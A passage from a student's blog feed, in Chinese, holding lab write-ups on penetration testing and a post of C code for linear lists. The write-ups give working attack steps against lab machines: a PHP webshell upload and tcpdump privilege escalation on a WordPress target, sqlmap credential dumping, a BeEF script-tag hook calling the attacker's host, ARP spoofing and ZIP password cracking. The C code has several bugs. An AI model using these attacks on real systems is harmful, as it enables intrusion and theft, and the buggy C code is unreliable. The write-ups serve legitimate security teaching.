src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211213144219455.png" alt="image-20211213144219455"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透实验四</title>
      <link href="/2021/12/06/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E5%9B%9B/"/>
      <url>/2021/12/06/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="网络渗透实验四-：CTF实践"><a href="#网络渗透实验四-：CTF实践" class="headerlink" title="网络渗透实验四 ：CTF实践"></a>网络渗透实验四 ：CTF实践</h1><h2 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h2><p>通过对目标靶机的渗透过程，了解CTF竞赛模式，理解CTF涵盖的知识范围，如MISC、PPC、WEB等，通过实践，加强团队协作能力，掌握初步CTF实战能力及信息收集能力。熟悉网络扫描、探测HTTP web服务、目录枚举、提权、图像信息提取、密码破解等相关工具的使用。</p><h2 id="系统环境："><a href="#系统环境：" class="headerlink" title="系统环境："></a>系统环境：</h2><p>Kali Linux 2、WebDeveloper靶机来源：<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a> </p><h2 id="实验步骤和内容："><a href="#实验步骤和内容：" class="headerlink" title="实验步骤和内容："></a>实验步骤和内容：</h2><h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>获取靶机Web Developer 文件&#x2F;root&#x2F;flag.txt中flag。</p><h3 id="基本思路："><a href="#基本思路：" class="headerlink" title="基本思路："></a>基本思路：</h3><p>本网段IP地址存活扫描(netdiscover)；网络扫描(Nmap)；浏览HTTP 服务；网站目录枚举(Dirb)；发现数据包文件 “cap”；分析 “cap” 文件，找到网站管理后台账号密码；插件利用（有漏洞）；利用漏洞获得服务器账号密码；SSH 远程登录服务器；tcpdump另类应用。</p><h3 id="实施细节："><a href="#实施细节：" class="headerlink" title="实施细节："></a>实施细节：</h3><p>首先用Nmap发现靶机：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207084329047.png"></p><p>发现靶机开了80端口和22端口</p><p>用浏览器打开<code>http://192/168/118.135</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207084613488.png"></p><p>用whatweb来得到网站的cms为WordPress</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207090856645.png"></p><p>爆破一下目录：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207085538623.png"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207085632724.png"></p><p>扫出了几个敏感目录，如文件上传目录<code>/wp-content/uploads/</code>,后台登录目录<code>/wp-admin/admin.php</code>,还有个奇怪的目录<code>/ipdata/</code></p><p>打开&#x2F;ipdata&#x2F;，发现有个cap文件，把它下载下来</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207090154498.png"></p><p>用Wireshark打开，看看有没有登录的数据包</p><p>因为登录的是用POST方法传递参数，所以用<code>http.request.method==POST</code>过滤一下</p><p>打开第一个数据包就能得到账号密码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207092105863.png"></p><p>拿这个账号密码去后台登录一下</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207100939737.png" alt="image-20211207100939737"></p><p>点击安装插件Plugins-&gt;Add New-&gt;Upload Plugin</p><p>在这里可以上传个php木马，因为它没过滤</p><p>php马：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207101248403.png" alt="image-20211207101248403"></p><p>上传后访问<code>/wp-content/uploads/2021/12/</code> </p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207101409524.png" alt="image-20211207101409524"></p><p>找到刚刚上传的文件，打开</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207101512849.png" alt="image-20211207101512849"></p><p>用蚁剑连接一下</p><p>url: <a href="http://192.168.52.70/wp-content/uploads/2021/12/ma.php">http://192.168.52.70/wp-content/uploads/2021/12/ma.php</a></p><p>密码:cmd</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207101910818.png" alt="image-20211207101910818"></p><p>webshell的权限比较低，没法打开root目录，寻找其他信息</p><p>在&#x2F;html&#x2F;找到wp-config.php，里面有有关数据库的配置</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207102913608.png" alt="image-20211207102913608"></p><p>盲猜这个也是服务器的账号密码，这个服务器还开着个ssh服务，尝试用ssh连接</p><pre><code>ssh webdeveloper@ip</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207103506765.png" alt="image-20211207103506765"></p><p>连接成功</p><p>但是权限不够</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207103716977.png" alt="image-20211207103716977"></p><p>接下来就是提权</p><p>使用tcpdump执行任意命令（当tcpdump捕获到数据包后会执行指定的命令。）</p><p>查看当前身份可执行的命令。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207104909692.png" alt="image-20211207104909692"></p><p>创建攻击文件</p><pre><code>touch /tmp/exploit</code></pre><p>写入shellcode</p><pre><code>echo &#39;cat /root/flag.txt&#39; &gt; /tmp/exploit</code></pre><p>赋予可执行权限</p><pre><code>chmod +x /tmp/exploit</code></pre><p>利用tcpdump执行任意命令</p><pre><code>sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207105849773.png" alt="image-20211207105849773"></p><p>拿到flag</p><h2 id="另一种姿势"><a href="#另一种姿势" class="headerlink" title="另一种姿势"></a>另一种姿势</h2><p>利用MeterSploit插件+reflex gallery插件漏洞实现</p><p>在上传插件处安装reflex gallery这个插件</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207190911989.png" alt="image-20211207190911989"></p><p>打开msfconsole</p><pre><code>use exploit/unix/webapp/wp_reflexgallery_file_upload</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207191141157.png" alt="image-20211207191141157"></p><p>然后就是修改配置</p><pre><code>set rhost 目标ip</code></pre><p>执行<code>exploit</code>,开始攻击</p><p>成功拿shell</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207191629125.png" alt="image-20211207191629125"></p><p>权限不高，还需要提权，提权方式同上</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透实验三</title>
      <link href="/2021/12/01/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%89/"/>
      <url>/2021/12/01/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h1 id="网络渗透实验三"><a href="#网络渗透实验三" class="headerlink" title="网络渗透实验三"></a>网络渗透实验三</h1><h2 id="sqlmap的简单使用"><a href="#sqlmap的简单使用" class="headerlink" title="sqlmap的简单使用"></a>sqlmap的简单使用</h2><h3 id="实战目标"><a href="#实战目标" class="headerlink" title="实战目标"></a>实战目标</h3><p>实战1：枚举登录MYSQL数据的用户名与密码</p><p>实战2：枚举所有数据库</p><p>实战3：枚举指定数据库的数据表</p><p>实战4：获取指定数据库和表中所有列的信息</p><p>实战5：枚举指定数据表中的所有用户名与密码</p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>kali（sqlmap）</p><p>metasplitable2-Linux（DVWA）</p><h3 id="实验开始"><a href="#实验开始" class="headerlink" title="实验开始"></a>实验开始</h3><p>用kali浏览器打开metasplitable2-Linux的DVWA靶场(admin&#x2F;password)</p><p>把等级调为最低–low</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211201201207598.png" alt="image-20211201201207598"></p><p>然后点击sql注入的对应模块</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211201201307588.png" alt="image-20211201201307588"></p><p>随便输入一个数字，发现url发生变化</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211201201536176.png" alt="image-20211201201536176"></p><p>注入点是在登录后的页面的，所以使用sqlmap还需要获取cookie</p><p>按下F12点击console,输入<code>document.cookie</code>得到cookie</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211201201737316.png" alt="image-20211201201737316"></p><p>sqlmap的基语法参数：</p><ul><li>-u ：指定目标URL，即注入点</li><li>–cookies：当前会话的cookies值</li><li>-b：获取数据库类型，检索数据库管理系统标识</li><li>–current-db：获取当前数据库</li><li>–current-user：获取当前登录数据库使用的用户</li></ul><p><a href="https://blog.csdn.net/weixin_46709219/article/details/109672641">其他命令参数看这里</a></p><p>打开终端，输入下面的命令</p><pre><code>sqlmap -u &quot;http://192.168.118.131/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=94eb2a6ac031fe1058d3fdfb2549346b&#39; -b  --current-db  --current-user</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204162534820.png" alt="image-20211204162534820"></p><p>可以看到以下信息：</p><pre><code>当前数据库&quot;dvwa&quot;数据库类型&quot;MySQL&quot;当前登录数据库使用的用户:&quot;root&quot;</code></pre><p>输入下列命令，获取用户名和密码</p><ul><li><p>–users：枚举数据库用户名</p></li><li><p>–password：枚举数据库用户的密码（hash）</p></li></ul><pre><code>sqlmap -u &quot;http://192.168.118.131/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=94eb2a6ac031fe1058d3fdfb2549346b&#39; --users --password</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204163346626.png" alt="image-20211204163346626"></p><p>得到用户名和密码</p><ul><li>–dbs:获取mysql下所有数据库</li></ul><pre><code>sqlmap -u &quot;http://192.168.118.131/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=94eb2a6ac031fe1058d3fdfb2549346b&#39; --dbs</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204163820440.png" alt="image-20211204163820440"></p><p>获取数据库信息</p><ul><li>-D：指定的数据库</li><li>–dump：存储数据表项</li></ul><pre><code>sqlmap -u &quot;http://192.168.118.131/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=94eb2a6ac031fe1058d3fdfb2549346b&#39; -D dvwa --dump</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204164604193.png" alt="image-20211204164604193"></p><p>其他命令就不多展示了</p><h2 id="XSS漏洞利用"><a href="#XSS漏洞利用" class="headerlink" title="XSS漏洞利用"></a>XSS漏洞利用</h2><ul><li><p>目标：</p><p>   利用Beef劫持客户端浏览器，通过目标主机浏览器获得该主机的详细信息。</p></li><li><p>环境</p></li></ul><p>​<code>桥接模式下进行</code></p><p>​1．Kali（使用beef生成恶意代码）(192.168.10.128)</p><p>​2．一台web服务器（留言板网站存在XSS跨站脚本漏洞）(192.168.10.117)</p><p>​3.客户端（用于访问web服务器）(192.168.10.107)</p><h3 id="实验开始："><a href="#实验开始：" class="headerlink" title="实验开始："></a>实验开始：</h3><p>将附件GuestBook丢进虚拟机里，搭建网站，可在Windows Server利用IIS(Internet Information Server)配置该网站</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204170342140.png" alt="image-20211204170342140"></p><p>搭建完成后访问，http:&#x2F;&#x2F;服务器ip&#x2F;Message.asp，即<code>http://192.168.10.117/Message.asp</code></p><p>在这里有个留言板</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204202954509.png" alt="dss"></p><p>来到kali，用AWVS扫一下，发现存在XSS漏洞</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204210734444.png" alt="image-20211204210734444"></p><p>模仿攻击者攻击</p><p>打开终端输入<code>beef-xss</code>,得到payload</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204203620720.png" alt="image-20211204203620720"></p><pre><code>&lt;script src=&quot;http://&lt;kali ip&gt; :3000/hook.js&quot;&gt;&lt;/script&gt;我这里的是&lt;script src=&quot;http://192.168.10.128:3000/hook.js&quot;&gt;&lt;/script&gt;</code></pre><p>将payload输入到留言板的内容项里，其他的也要填，随便填，E-mail处有格式检验，要符合格式</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204203857334.png" alt="image-20211204203857334"></p><p>填完后，点击留言</p><p>来到客户机，即受害者</p><p>当受害者打开这个网站，正常的留言后，提交，网页会跳转到<a href="http://192.168.10.117/index.asp">http://192.168.10.117/index.asp</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204204607670.png" alt="image-20211204204607670"></p><p>这里已经有着攻击者构造的恶意代码，受害者的主机信息就会返回到攻击者的服务器上</p><p>kali(攻击者)已经获得受害者的主机和浏览器信息</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204205445225.png" alt="image-20211204205445225"></p><p>1.Details是浏览器信息</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204210030531.png" alt="image-20211204210030531"></p><p>2.logs模块是键盘记录，即用户执行的鼠标键盘记录</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204210153841.png" alt="image-20211204210153841"></p><p>其他模块查看<a href="https://blog.csdn.net/smli_ng/article/details/106067842">这里</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性表</title>
      <link href="/2021/11/27/%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
      <url>/2021/11/27/%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="线性表的基本操作"><a href="#线性表的基本操作" class="headerlink" title="线性表的基本操作"></a>线性表的基本操作</h2><p>顺序表定义</p><pre><code class="c">typedef int DataType;struct List&#123;    int Max;//最大元素个数    int n;//实际元素个数    DataType *elem;//首地址&#125;;typedef struct List *SeqList;//顺序表类型定义</code></pre><p>顺序表遍历</p><pre><code class="c">void Print(SeqList slist)&#123;    int i;    for(i=0;i&lt;slist-&gt;n;i++)        printf(&quot;%d\n&quot;,slist-&gt;elem[i]);&#125;</code></pre><p>创建空顺序表</p><pre><code class="c">SeqList SetNullList_Seq(int m)//m为顺序表最大值&#123;    SeqList slist=(SeqList)malloc(sizeof(struct List)*m);//申请结构体空间    if(slist!=NULL)    &#123;        slist-&gt;elem=(DataType *)malloc(sizeof(int)*m);//申请顺序表空间，大小为m个int空间        if(slist-&gt;elem)        &#123;            slist-&gt;Max=m;            slist-&gt;n=0;           return(slist);         &#125;        else free(slist);            &#125;    printf(&quot;Alloc failure!\n&quot;);    return NULL;&#125;</code></pre><p>判断顺序表为空</p><pre><code class="c">int IsNullList_Seq(SeqList slist)&#123;    return(slist-&gt;n==0);&#125;</code></pre><p>顺序表–插入</p><pre><code class="c">int InserPre_seq(SeqList slist,int p,DataType x)//在线性表slist的p之前插入x,如果成功返回1，不成功返回0；&#123;    int q;    if(slist-&gt;n=slist-&gt;Max)    &#123;        printf(&quot;overflow&quot;);        return 0;    &#125;    if(p&lt;0||p&gt;slist-&gt;n)    &#123;        printf(&quot;not exist!\n&quot;);        rerurn 0;    &#125;    for(q=slist-&gt;n-1;q&gt;=p;q--)        slist-&gt;elem[q+1]=slist-&gt;elem[q];     slist-&gt;elem[p]=x;     slist-&gt;n=slist-&gt;n+1;     return 1;    &#125;</code></pre><p>顺序表–删除</p><pre><code class="c">int DdlIdex_seq(SeqList slist,int p)//删除下标为p的元素&#123;    int q;    if(q&lt;0||q&gt;slist-&gt;Max)    &#123;        printf(&quot;Not exist\n&quot;);        return 0;    &#125;    for(q=p;q&lt;slist-&gt;n-1;q++)        slist-&gt;elem[q]=slist-&gt;elem[q+1]；    slist-&gt;n=slist-&gt;n-1;    return 1;&#125;</code></pre><p>顺序表–查找</p><pre><code class="c">int LocateIndex_seq(SeqList slist,int x)//查找值为x的元素，返回元素的下标&#123;    int q;    for(q=0;q&lt;slist-&gt;n;q++)    &#123;        if(slist-&gt;elem[q]==x)            return q;    &#125;    return -1;    &#125;</code></pre><p>顺序表–二分查找–非递归</p><pre><code class="c">int Binsearch(SeqList slist,int key,int *pos)&#123;    int index=1;//比较次数    int mid;    int low=0;    int high=slist-&gt;n-1;    while(low&lt;=high)    &#123;        mid=(low+high)/2;        if(slist-&gt;elem[mid]==key)        &#123;            *pos=mid;            printf(&quot;找到，共进行%d次比较\n&quot;,index);            printf(&quot;要找到的数据%d在位置%d上\n&quot;,key,mid);            return 1;        &#125;        else if(slist-&gt;elem[mid]&gt;key)            high=mid-1;            else                low=mid+1;        index++;    &#125;    *pos=low;    printf(&quot;没有找到，共比较%d次\n&quot;,index-1);    printf(&quot;可将此数据插入到位置%d上\n&quot;,*pos);    return -1;&#125;</code></pre><p>顺序表–二分查找–递归</p><pre><code class="c">int Binsearch_recursion(SeqList slist,int key,int low,int high,int *pos)&#123;    int mid;    if(low&lt;=hight)    &#123;        mid=(low+high)/2;        if(slist-&gt;elem[mid]==key)        &#123;            printf(&quot;要找的数据%d在位置%d上&quot;,key,mid);            return 1;        &#125;        if(slist-&gt;elem[mid]&gt;key)        &#123;            *pos=mid;            return Binsearch_recursion(slist,key,low,mid-1,pos);            if(slist-&gt;elem[mid]&lt;key)            &#123;                *pos=mid+1;            return Binsearch_recursion(slist,key,mid+1,high,pos+1);            &#125;        &#125;    &#125;    printf(&quot;没有找到，可将此数插入到位置%d上\n&quot;,*pos);    return -1;&#125;</code></pre><hr><hr><p>链表定义</p><pre><code class="c">typedef int DataType;struct Node&#123;    DataType data; //数据域    struct Node *next;//指针域&#125;;typedef struct Node *PNode;//节点类型定义typedef struct Node *LinkList;//单链表类型定义</code></pre><p>链表遍历</p><pre><code class="c">void Print(LinkList head)&#123;    PNode p=head-&gt;next;    while(p)    &#123;        printf(&quot;%d\n&quot;,p-&gt;data);        p=p-&gt;next;    &#125;&#125;</code></pre><p>创建单链表</p><pre><code class="c">LinkList SetNullList_List()&#123;    LinkList head=(LinkList)malloc(sizeof(struct Node));    if(head!=NULL)        head-&gt;next=NULL;    else        printf(&quot;Alloc faliure&quot;);    return head;&#125;</code></pre><p>判断链表为空</p><pre><code class="c">int IsNull_List(Linklist head)&#123;    return(head-&gt;next==NULL);&#125;</code></pre><p>头插法建立单链表</p><pre><code class="c">void CreateList_Head(struct Node *head)&#123;    PNode p=NULL;    int data;    printf(&quot;请输入整型数据建立链表，以-1结束\n&quot;);    scanf(&quot;%d&quot;,&amp;data);    while(data!=-1)    &#123;        p=(struct Node)malloc(sizeof(struct Node));        p-&gt;data=data;        p-&gt;next=head-&gt;next;        head-&gt;head=p;        scanf(&quot;%d&quot;,&amp;data);     &#125;&#125;</code></pre><p>尾插法建立单链表</p><pre><code class="c">void CreateList_Tail(struct Node *head)&#123;    PNode p=NULL;    PNode q=head;    int data;    printf(&quot;请输入整型数据建立链表，以-1结束\n&quot;);    scanf(&quot;%d&quot;,&amp;data);    while(data!=1)    &#123;        p=(struct Node)malloc(sizeof(struct Node));        p-&gt;data=data;        p-&gt;next=NULL;        q-&gt;next=p;        q=p;        scanf(&quot;%d&quot;,&amp;data);    &#125;&#125;</code></pre><p>单链表的查找</p><pre><code class="c">PNode Locate_Link(LinkList list,DataType x)&#123;    PNode p;    if(llist==NULL) return NULL;    p=llist-&gt;next;    while(p!=NULL&amp;&amp;p-&gt;data!=x)        p=p-&gt;next;    return p;&#125;</code></pre><p>单链表的插入–后插算法</p><pre><code class="C">int InsertPost_Link(LinkList llist,PNode p,DataType x)//在llist链表中的p位置之后插入值为x的结点&#123;    PNode q;    if(p==NUll)    &#123;        printf(&quot;para meter failure!\n&quot;);        return 0;    &#125;    q=(PNode)malloc(sizeof(struct Node));    if(q==NULL)    &#123;        printf(&quot;Alloc failure!\n&quot;);        return 0;    &#125;    else    &#123;        q-&gt;data=x;        q-&gt;next=p-&gt;next;        p-&gt;next=q;        return 1;    &#125;&#125;</code></pre><p>单链表的插入–前插算法</p><pre><code class="c">int InsertPre_Link(LinkList llist,PNode p,DataType x)//在llist链表中的p位置之前插入值为x的结点&#123;    PNode q=NULL;    PNode pre=llist;    while(pre-&gt;next!=p)//定位前p的前驱结点    &#123;        pre=pre-&gt;next;    &#125;    q=(PNode)malloc(sizeof(struct Node));    if(q==NULL)return 0;    q-&gt;data=x;    q-&gt;next=p;    pre-&gt;next=q;    return 1;&#125;</code></pre><p>单链表按位删除</p><pre><code class="c">void DelPostion_link(LinkList head,PNode r)//删除r指针所指的结点&#123;    PNode pre=head;    while(pre-&gt;next!=r)    &#123;        pre=pre-&gt;next;    &#125;    pre-&gt;next=r-&gt;next;    free(r);&#125;</code></pre><p>单链表按值删除</p><pre><code class="c">void DelValue_Link(struct Node *head,int data)&#123;    struct Node *p=head-&gt;next;    struct Node *beforeP=head;    while(p!=NUll)    &#123;        if(p-&gt;data==data)        &#123;            beforeP-&gt;next=p-&gt;next;            free(p);            break;        &#125;        else        &#123;            beforeP=p;            p=p-&gt;next;        &#125;    &#125;&#125;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透实验二</title>
      <link href="/2021/11/23/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%BA%8C/"/>
      <url>/2021/11/23/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="网络渗透实验二"><a href="#网络渗透实验二" class="headerlink" title="网络渗透实验二"></a>网络渗透实验二</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的:"></a>实验目的:</h2><p>1、通过使用Wireshark软件掌握Sniffer（嗅探器）工具的使用方法，实现捕捉HTTP等协议的数据包，以理解TCP&#x2F;IP协议中多种协议的数据结构、通过实验了解HTTP等协议明文传输的特性。</p><p>2、研究交换环境下的网络嗅探实现及防范方法，研究并利用ARP协议的安全漏洞，通过Arpspoof实现ARP欺骗以捕获内网其他用户数据。</p><p>3、能利用BrupSuite实现网站登录暴力破解获得登录密码。</p><p>4、能实现ZIP密码破解，理解安全密码的概念和设置。</p><h2 id="系统环境："><a href="#系统环境：" class="headerlink" title="系统环境："></a>系统环境：</h2><p>Kali Linux 2、Windows</p><h2 id="网络环境："><a href="#网络环境：" class="headerlink" title="网络环境："></a>网络环境：</h2><p>交换网络结构</p><h2 id="实验工具："><a href="#实验工具：" class="headerlink" title="实验工具："></a>实验工具：</h2><p>Arpspoof</p><p>WireShark</p><p>BurpSuite</p><p>fcrackzip</p><p>以上工具kali有</p><h2 id="实验步骤和内容："><a href="#实验步骤和内容：" class="headerlink" title="实验步骤和内容："></a>实验步骤和内容：</h2><h3 id="网络嗅探部分："><a href="#网络嗅探部分：" class="headerlink" title="网络嗅探部分："></a>网络嗅探部分：</h3><p>网络嗅探：Wireshark 监听网络流量，抓包。</p><p>ARP欺骗： ArpSpoof，实施ARP欺骗。</p><p>防范： 防范arp欺骗。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/wps31B8.tmp.png" alt="img"></p><ul><li><p>1、A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)。</p></li><li><ul><li>1.1 写出以上过滤语句。</li></ul></li><li><ul><li>1.2 B是否能看到A和外网的通信（A刚输入的帐户和口令）？为什么？</li></ul></li></ul><p>这里开了两个虚拟机，一个是kali(192.168.118.128)，即B,一个是win10(192.168.118.132)，即A</p><p>先用nmap 扫一下看看</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211123230256003.png"></p><p>一点问题都没有，继续下一步</p><p>kali打开Wireshark抓包，用win10 ping一下kali</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211123231447162.png" alt="image-20211123231447162"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211123231514291.png" alt="image-20211123231514291"></p><p>过滤语句是</p><pre><code>ip.src==192.168.118.132</code></pre><p>因为ping是使用ICMP协议的，所以找到ICMP,下面的Data即为ping的内容</p><ul><li>2.1 为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？</li></ul><blockquote><p>B冒充的是子网中的网关</p></blockquote><ul><li>2.2 写出arpspoof命令格式。</li></ul><blockquote><p>arpspoof -i 指定使用的网卡 -t 要欺骗的主机ip   冒充的网关</p></blockquote><p>如果arpspoof没有安装,执行下面命令</p><pre><code>sudo apt-get install dsniff</code></pre><p>为了不让靶机使用者发现，需要他打开端口转发，不然B主机没法上网</p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><p>因为我使用的是两虚拟机，NAT模式下进行，<code>kali(192.168.118.128),win10(192.168.118.132)</code>,网关<code>192.168.118.2</code></p><pre><code>先执行这个echo 1 &gt; /proc/sys/net/ipv4/ip_forward再执行这个arpspoof -i eth0 -t 192.168.118.132 192.168.118.2</code></pre><ul><li>2.3 B是否能看到A和外网的通信（A刚输入的帐户和口令）？</li></ul><blockquote><p>可以，具体操作看下题</p></blockquote><ul><li>2.4 在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，截图Wireshark中显示的明文信息。</li></ul><blockquote><p> 保持kali对win10的“欺骗”，打开Wireshark进行抓包，win10打开某网站，XX生活网，随便输入账号密码，点击登录</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124180851625.png" alt="image-20211124180851625"></p><blockquote><p>返回kali的Wireshark停止抓包，输入过滤<code>http and ip.src==192.168.118.132</code></p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124181643055.png" alt="image-20211124181643055"></p><blockquote><p>这里可以看到win10和外网的通讯和以明文传输的账号密码</p></blockquote><ul><li><p>3 、FTP数据还原部分：利用WireShark打开实验实验数据data.pcapng。</p></li><li><p>3.1 FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？</p></li></ul><blockquote><p>先过滤流，输入<code>ftp</code></p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124183328218.png" alt="image-20211124183328218"></p><blockquote><p>查看info的response,因为response是FTP服务器对客户请求进行响应，所以这个source就是FTP服务器的IP，即<code>192.168.182.1</code></p></blockquote><ul><li>3.2客户端登录FTP服务器的账号和密码分别是什么?</li></ul><blockquote><p>客户端登录FTP服务器,即request,查看info的request即可</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124184417803.png" alt="image-20211124184417803"></p><blockquote><p>可以看到有两个账号密码，分别是 <code>anonymous/mozilla@example.com</code>和<code>student/sN46i5y</code></p></blockquote><ul><li>3.3 客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？<em>提示：文件名有可能是中文。</em></li></ul><blockquote><p>把刚刚的过滤去掉，点击编辑-&gt;查找分组，把设置更改为下图</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124185054140.png" alt="image-20211124185054140"></p><p>在查找框中输入zip的文件头<code>504b0304</code>,在过滤框中输入<code>ftp-data</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124185839994.png" alt="image-20211124185839994"></p><blockquote><p>可以看到有两个文件，1.zip和复习题.txt，下面是对文件进行还原保存</p></blockquote><blockquote><p>选中1.zip的数据流，右键-&gt;追踪流-&gt;TPC流,然后</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124191030128.png" alt="image-20211124191030128"></p><blockquote><p>保存得到1.zip</p></blockquote><ul><li>3.4 还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。</li></ul><blockquote><p>尝试解压1.zip发现需要密码，直接丢进kali进行爆破</p><p>先下载fcrackzip</p></blockquote><pre><code>sudo apt-get fcrackzip</code></pre><p>1.zip的位置在桌面，在桌面打开终端，输入下面命令</p><pre><code>fcrackzip -v -b -u -l 1-10 -c1 1.zip</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124192057379.png" alt="image-20211124192057379"></p><blockquote><p>得到密码为<code>123456</code></p></blockquote><blockquote><p>fcrackzip的使用查看这篇<a href="https://blog.csdn.net/weixin_41924764/article/details/114682970">文章</a></p></blockquote><blockquote><p>解压后得到如下图片</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/Penguins.jpg" alt="Penguins"></p><ul><li>3.5 TXT文件的内容是什么？</li></ul><blockquote><p>这个不用保存就可以看到，选中复习题.txt的数据流，右键-&gt;追踪流-&gt;TPC流,然后就可以看到内容了</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124191431879.png" alt="image-20211124191431879"></p><ul><li><p>网站密码破解部分：</p><p>  